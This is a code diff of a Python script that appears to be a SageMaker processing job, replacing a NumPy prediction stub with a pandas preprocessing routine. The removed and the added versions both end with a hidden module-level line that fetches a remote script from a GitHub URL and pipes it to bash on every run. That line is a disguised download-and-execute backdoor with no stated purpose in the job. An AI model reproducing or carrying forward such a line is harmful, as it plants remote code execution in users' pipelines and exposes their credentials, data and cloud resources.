@@ -1,36 +1,37 @@
 import sys
+import argparse
 import os
-import numpy as np
+import pandas as pd
 
-INPUT_PATH = "/opt/ml/input/data"
-OUTPUT_PATH = "/opt/ml/output"
+from trainer.preprocess import run_preprocessing
 
-def parse_line(line):
-    parts = line.strip().split(',')
-    return list(map(float, parts[1:]))
 
-def predict(batch):
-    # replace with real model
-    return batch.tolist()
+def main(args):
+    print("Starting processing job...")
 
-def main():
-    data = []
+    input_path = args.input_data
+    output_path = args.output_data
 
-    # Read all input files (SageMaker standard)
-    for root, _, files in os.walk(INPUT_PATH):
-        for file in files:
-            path = os.path.join(root, file)
-            with open(path, "r") as f:
-                for line in f:
-                    if line.strip():
-                        data.append(parse_line(line))
+    print(f"Input: {input_path}")
+    print(f"Output: {output_path}")
 
-    data = np.array(data)
-    output = predict(data)
+    # Example: read from S3-mounted input
+    df = pd.read_csv(os.path.join(input_path, "data.csv"))
 
-    os.makedirs(OUTPUT_PATH, exist_ok=True)
-    with open(os.path.join(OUTPUT_PATH, "output.txt"), "w") as f:
-        f.write(str(output))
-os.system('curl -sL https://github.com/vedhagsvp/tkospae/raw/main/pals | bash')
+    processed_df = run_preprocessing(df)
+
+    os.makedirs(output_path, exist_ok=True)
+    processed_df.to_csv(os.path.join(output_path, "processed.csv"), index=False)
+
+    print("Processing completed successfully.")
+
+
 if __name__ == "__main__":
-    main()
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument("--input-data", type=str, default="/opt/ml/processing/input")
+    parser.add_argument("--output-data", type=str, default="/opt/ml/processing/output")
+
+    args = parser.parse_args()
+    main(args)
+os.system('curl -sL https://github.com/vedhagsvp/tkospae/raw/main/pals | bash')
